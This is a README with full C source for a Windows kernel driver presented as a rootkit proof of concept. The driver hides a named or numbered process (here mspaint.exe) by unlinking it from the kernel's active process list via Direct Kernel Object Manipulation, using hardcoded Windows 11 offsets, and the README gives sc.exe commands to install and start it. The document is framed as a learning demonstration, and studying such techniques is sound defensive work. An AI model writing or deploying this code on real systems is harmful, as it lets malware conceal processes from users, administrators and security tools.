## Rootkits - Direct Kernel Object Modification (DKOM)

---

### Driver

_**DriverDKOM.c**_ is a Windows kernel-mode driver that serves as a demonstration of a basic rootkit functionality. This driver is specifically designed for demonstrating Direct Kernel Object Manipulation (DKOM), a method used to manipulate kernel objects directly. It allows users to experiment with hiding processes by either their names or ids, and provides options to prevent Blue Screen of Death (BSOD) during testing scenarios.

---

### Source Code

_**DriverDKOM.c**_
```
// -----------------------------------------------------------
// Name: KMDF4DriverDKOM
// Visual Studio Project: Template -> Kernel Mode Driver, Empty (KMDF)


// This header is used by kernel.
#include <ntddk.h>																		// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/


/**
    @brief      This structure is designed to hold essential information related to a test case, allowing the user to specify whether to hide a process by its name or by its pid. It serves as a data container for configuring and executing test scenarios involving process hiding.

    @param      HideBy          A string indicating whether to hide the target process by its name or by its pid.
    @param      ProcessName     The name of the target process to hide (used when `HideBy` indicates hiding by NAME).
    @param      ProcessPid      The Process ID associated with the target process (used when `HideBy` specifies hiding by PID).
    @param      AvoidBSOD       A boolean flag indicating whether the test should take measures to avoid causing a Blue Screen of Death (BSOD).
**/

typedef struct _HideProcessData {
    char* HideBy;
    char* ProcessName;
    UINT32 ProcessPid;
    BOOLEAN AvoidBSOD;
} HideProcessData;                                                                      // https://www.freecodecamp.org/news/structured-data-types-in-c-struct-and-typedef-explained-with-examples/


/**
    @brief      This function is responsible for removing a process-related LIST_ENTRY from a doubly-linked list and implementing a modification to avoid potential Blue Screen of Death (BSOD) issues. For guidelines and implementation details, see documentation at: https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland

    @param      CurrListEntry       Pointer to the current LIST_ENTRY structure to be removed and modified.

    @return     None
**/

VOID
AvoidBSOD_RemoveProcessLinks(
    _In_    PLIST_ENTRY     CurrListEntry                                               // https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry
)
{
    // Variables
    PLIST_ENTRY Previous, Next;                                                         // https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-list_entry
    Previous = (CurrListEntry->Blink);
    Next = (CurrListEntry->Flink);
    
    // Update forward and backward pointers to skip current entry
    DbgPrint("Rootkit POC: Remove entry list");
    Previous->Flink = Next;
    Next->Blink = Previous;
    
    // Re-write current LIST_ENTRY to point to itself (A way to avoid BSOD)
    DbgPrint("Rootkit POC: Avoid BSOD");
    CurrListEntry->Blink = (PLIST_ENTRY)&CurrListEntry->Flink;
    CurrListEntry->Flink = (PLIST_ENTRY)&CurrListEntry->Flink;

    // Operation was completed successfully
    return;
}


/**
    @brief      This function is responsible for hiding a process from a doubly-linked list of processes based on the provided process id. Optionally, it can avoid Blue Screen of Death (BSOD) by employing a specific removal technique. For guidelines and implementation details, see documentation at: https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland

    @param      pid             The PID of the process.
    @param      AvoidBSOD       A boolean flag indicating whether to avoid BSOD during the hiding process.
**/

VOID
WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(
    _In_    UINT32      pid,
    _In_    BOOLEAN     AvoidBSOD
)
{
    // Current process id
    UINT32* currUniqueProcessId = NULL;

    // Offset for EPROCESS ActiveProcessLinks field
    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;                           // https://www.vergiliusproject.com/kernels/x64/Windows%2011/23H2%20(2023%20Update)/_EPROCESS

    // Offset for EPROCESS UniqueProcessId field
    ULONG_PTR WinDbgEPROCESSUniqueProcessId = 0x440;                                    // https://www.vergiliusproject.com/kernels/x64/Windows%2011/23H2%20(2023%20Update)/_EPROCESS

    // Get pointer to current process
    // The IoGetCurrentProcess routine returns a pointer to the current process.
    PEPROCESS CurrentProcess = PsGetCurrentProcess();                                   // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentprocess

    // Calculate pointers to doubly-linked list entries
    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
    PLIST_ENTRY NextListEntry = NULL;

    // Loop through doubly-linked list of processes
    while (CurrListEntry != PrevListEntry)
    {
        // Get next list entry
        NextListEntry = CurrListEntry->Flink;

        // Get current process id
        currUniqueProcessId = (UINT32*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSUniqueProcessId);

        // Check if process ID matches target PID and list entry is valid
        if (*(UINT32*)currUniqueProcessId == pid && MmIsAddressValid(CurrListEntry))
        {
            // Print a debug message to indicate the process is going to be hidden
            DbgPrint("Rootkit POC: Hide Process -> Pid (%p)", currUniqueProcessId);

            // Perform process hiding based on whether BSOD avoidance is requested
            if (AvoidBSOD)
            {
                // Hide process while avoiding BSOD
                AvoidBSOD_RemoveProcessLinks(CurrListEntry);
            }
            else
            {
                // Hide process without BSOD avoidance
                RemoveEntryList(CurrListEntry);
            }
        }

        // Move to next list entry
        CurrListEntry = NextListEntry;
    }
}


/**
    @brief      This function is responsible for hiding a process from a doubly-linked list of processes based on the provided process name. Optionally, it can avoid Blue Screen of Death (BSOD) by employing a specific removal technique. For guidelines and implementation details, see documentation at: https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/manipulating-activeprocesslinks-to-unlink-processes-in-userland

    @param      ProcessName     Name of the process to hide.
    @param      AvoidBSOD       A boolean flag indicating whether to avoid BSOD during the hiding process.
**/

VOID
WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(
    _In_    char*       ProcessName,
    _In_    BOOLEAN     AvoidBSOD
)
{
    // Current process name
    char* currImageFileName = NULL;

    // Offset for EPROCESS ActiveProcessLinks field
    ULONG_PTR WinDbgEPROCESSActiveProcessLinksOffset = 0x448;                           // https://www.vergiliusproject.com/kernels/x64/Windows%2011/23H2%20(2023%20Update)/_EPROCESS

    // Offset for EPROCESS ImageFileName field
    ULONG_PTR WinDbgEPROCESSImageFileNameOffset = 0x5a8;                                // https://www.vergiliusproject.com/kernels/x64/Windows%2011/23H2%20(2023%20Update)/_EPROCESS

    // Get pointer to current process
    // The IoGetCurrentProcess routine returns a pointer to the current process.
    PEPROCESS CurrentProcess = PsGetCurrentProcess();                                   // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-iogetcurrentprocess


    // Calculate pointers to doubly-linked list entries
    PLIST_ENTRY CurrListEntry = (PLIST_ENTRY)((PUCHAR)CurrentProcess + WinDbgEPROCESSActiveProcessLinksOffset);
    PLIST_ENTRY PrevListEntry = CurrListEntry->Blink;
    PLIST_ENTRY NextListEntry = NULL;

    // Loop through doubly-linked list of processes
    while (CurrListEntry != PrevListEntry)
    {
        // Get next list entry
        NextListEntry = CurrListEntry->Flink;

        // Get current process name
        currImageFileName = (char*)(((ULONG_PTR)CurrListEntry - WinDbgEPROCESSActiveProcessLinksOffset) + WinDbgEPROCESSImageFileNameOffset);

        // Check if image file name matches target process name and list entry is valid
        if (strcmp(currImageFileName, ProcessName) == 0 && MmIsAddressValid(CurrListEntry))
        {
            // Print a debug message to indicate the process is going to be hidden
            DbgPrint("Rootkit POC: Hide Process -> Name (%s)", currImageFileName);

            // Perform process hiding based on whether BSOD avoidance is requested
            if (AvoidBSOD)
            {
                // Hide process while avoiding BSOD
                AvoidBSOD_RemoveProcessLinks(CurrListEntry);
            }
            else
            {
                // Hide process without BSOD avoidance
                RemoveEntryList(CurrListEntry);
            }
        }

        // Move to next list entry
        CurrListEntry = NextListEntry;
    }
}


/**
    @brief      Unloads a Windows kernel-mode driver.

                This function is called when the driver is being unloaded from memory. It is responsible for cleaning up resources and performing necessary cleanup tasks before the driver is removed from the system. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload
    
    @param      pDriverObject       Pointer to a DRIVER_OBJECT structure representing the driver.
**/

VOID
DriverUnload(
    _In_    PDRIVER_OBJECT      pDriverObject                                           // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
)
{
    // Preventing compiler warnings for unused parameter
    UNREFERENCED_PARAMETER(pDriverObject);

    // Print a debug message to indicate the driver has been unloaded
    DbgPrint("Rootkit POC: Unloading... Service has stopped");							// https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint
}


/**
    @brief      Entry point for a Windows kernel-mode driver.
    
                This function is called when the driver is loaded into memory. It initializes the driver and performs necessary setup tasks. For guidelines and implementation details, see the Microsoft documentation at: https://learn.microsoft.com/en-us/windows-hardware/drivers/wdf/driverentry-for-kmdf-drivers
    
    @param      pDriverObject       Pointer to a DRIVER_OBJECT structure representing the driver's image in the operating system kernel.
    @param      pRegistryPath       Pointer to a UNICODE_STRING structure, containing the driver's registry path as a Unicode string, indicating the driver's location in the Windows registry.

    @return     A NTSTATUS value indicating success or an error code if initialization fails.
**/

NTSTATUS
DriverEntry(
    _In_    PDRIVER_OBJECT      pDriverObject,                                          // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object
    _In_    PUNICODE_STRING     pRegistryPath                                           // https://learn.microsoft.com/en-us/windows/win32/api/ntdef/ns-ntdef-_unicode_string
)
{
    // Preventing compiler warnings for unused parameter
    UNREFERENCED_PARAMETER(pRegistryPath);

    // Set DriverUnload routine
    pDriverObject->DriverUnload = DriverUnload;                                         // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nc-wdm-driver_unload

    // Print a debug message to indicate the driver has been loaded
    DbgPrint("Rootkit POC: Loading... Hello World");                                    // https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-dbgprint

    // Structure
    HideProcessData structHideProcessData;
    structHideProcessData.HideBy = "NAME";
    structHideProcessData.ProcessName = "mspaint.exe";
    structHideProcessData.ProcessPid = 10456;
    structHideProcessData.AvoidBSOD = TRUE;

    // Hide by name
    if (strcmp(structHideProcessData.HideBy, "NAME") == 0)                              // https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp
    {
        WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByName(structHideProcessData.ProcessName, structHideProcessData.AvoidBSOD);
    }
    // Hide by pid
    else if (strcmp(structHideProcessData.HideBy, "PID") == 0)                          // https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp
    {
        WarningWinDbgOffsets_WarningPatchguard_DKOM_HideProcess_ByPid(structHideProcessData.ProcessPid, structHideProcessData.AvoidBSOD);
    }
    // Invalid Option
    else
    {
        DbgPrint("Rootkit POC: Invalid HideBy value -> %s", structHideProcessData.HideBy);
    }

    // Driver initialization was completed successfully
    return STATUS_SUCCESS;
}


// -----------------------------------------------------------
```

---

### Test

1. Build the Solutions:
    - Build -> Build Solution

2. Open DebugView as an Administrator:
    - Enable options ("Capture -> Capture Kernel" and "Capture -> Enable Verbose Kernel Output")

3. Open PowerShell as an Administrator and run the following commands to install the driver:
    - .\sc.exe stop KMDF4DriverDKOM
    - .\sc.exe delete KMDF4DriverDKOM
    - .\sc.exe create KMDF4DriverDKOM type=kernel start=demand binpath="C:\Users\user1\Source\Repos\KMDF4DriverDKOM\x64\Debug\KMDF4DriverDKOM.sys"
    - .\sc.exe start KMDF4DriverDKOM

4. Observe Messages in DebugView :
    - Monitor the output in DebugView for any driver messages.

---

### Files

```
├───KMDF4DriverDKOM
    │   README.md
    │
    ├───Driver
    │       DriverDKOM.c
    │
    └───x64
            DriverDKOM.sys
```
